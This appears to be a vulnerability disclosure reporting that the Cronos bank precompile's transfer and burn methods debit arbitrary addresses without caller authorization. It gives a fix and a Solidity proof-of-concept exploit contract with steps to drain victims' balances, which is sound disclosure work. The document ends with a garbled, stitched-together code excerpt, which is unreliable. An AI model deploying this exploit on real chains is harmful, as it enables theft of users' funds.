### Title
Bank Precompile `transfer` and `burn` Accept Arbitrary `sender`/`recipient` Without Caller Authorization — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` EVM precompile exposes `transfer` and `burn` methods that accept an arbitrary address argument as the token source. Neither method verifies that the supplied address equals `contract.Caller()`. Any EVM contract can therefore drain or destroy `evm/<contractAddress>` native bank tokens held by any account, without that account's consent.

### Finding Description
The `BankContract` precompile at `x/cronos/keeper/precompiles/bank.go` implements three state-mutating methods: `mint`, `burn`, and `transfer`. The denom for all three is derived from the calling contract's address:

```go
denom := EVMDenom(contract.Caller())   // "evm/0x<callerAddress>"
```

For `burn`, the address to debit is taken directly from the ABI argument:

```go
recipient := args[0].(common.Address)          // line 121 – misleadingly named; this is the burn source
addr := sdk.AccAddress(recipient.Bytes())       // line 126
// ...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))  // line 144
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))                           // line 147
```

For `transfer`, the sender is likewise taken from the ABI argument:

```go
sender := args[0].(common.Address)             // line 175
from   := sdk.AccAddress(sender.Bytes())        // line 181
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // line 192
```

In neither case is there a guard of the form `require sender == contract.Caller()`. The calling contract can supply **any** address as `sender`/`recipient` and the bank keeper will execute the transfer or burn unconditionally. [1](#0-0) [2](#0-1) 

### Impact Explanation
`evm/<contractAddress>` tokens are native Cosmos bank-module coins managed exclusively through this precompile. They are "precompile-controlled assets" under the allowed Critical impact scope.

**Attack scenario:**

1. Attacker deploys a contract `0xATK`.
2. Attacker calls `bank.mint(victim, N)` → victim now holds `N` units of `evm/0xATK`.
3. Attacker calls `bank.transfer(victim, attacker, N)` (or `bank.burn(victim, N)`) → victim's balance is drained/destroyed without any approval from the victim.

Because the denom is bound to `0xATK`, the attacker fully controls the supply and can issue tokens to users (e.g., as DeFi rewards or airdrop) and then silently reclaim or destroy them at will. This constitutes an **unauthorized transfer/burn of precompile-controlled assets** — a Critical impact per the allowed scope. [3](#0-2) 

### Likelihood Explanation
The entry path is fully unprivileged: any EOA can deploy a contract and call the bank precompile. No admin key, governance vote, or validator compromise is required. The only precondition is that victims hold `evm/<attackerContract>` tokens, which the attacker can arrange by minting them as part of a seemingly legitimate protocol interaction.

### Recommendation
In both the `TransferMethodName` and `BurnMethodName` branches, enforce that the address being debited equals the EVM caller:

```go
// transfer
if sender != contract.Caller() {
    return nil, errors.New("sender must be caller")
}

// burn
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be caller")
}
```

Alternatively, remove the address argument entirely for `burn` and `transfer` and always derive the source address from `contract.Caller()`, mirroring how `mint` already derives the denom from `contract.Caller()`. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
}

contract BankPrecompileExploit {
    IBank constant bank = IBank(address(0x0000000000000000000000000000000000000064));

    // Step 1: issue tokens to victim (e.g., as "rewards")
    function issueRewards(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's balance without any approval
    function drain(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // OR: bank.burn(victim, amount);
    }
}
```

1. Deploy `BankPrecompileExploit` at address `0xATK`.
2. Call `issueRewards(victim, 1000)` — victim receives 1000 `evm/0xATK` tokens.
3. Call `drain(victim, attacker, 1000)` — victim's 1000 tokens are transferred to the attacker with no signature or approval from the victim.

The bank precompile executes `bankKeeper.SendCoins(victim, attacker, [{denom:"evm/0xATK", amount:1000}])` without any authorization check on `victim`. [1](#0-0)

	methodID := contract.Input[:4]

	if err != nil {
		return nil, err
	}

	precompileAddr := bc.Address()

	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}

				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {

					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")

			}
